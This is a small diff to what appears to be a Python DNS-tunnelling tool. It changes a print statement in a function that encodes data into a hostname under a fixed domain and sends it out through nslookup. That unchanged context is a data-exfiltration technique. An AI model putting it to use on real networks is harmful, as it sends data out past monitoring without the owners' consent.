@@ -30,4 +30,4 @@ def tunnel(data):
     target = str(data)+ IDENTIFIER_STRING + FQDN
     print(target)
     output = subprocess.call(['nslookup', target],stdout=subprocess.DEVNULL)
-    print("sent ",data)
+    print("sent ",data," to ",target)
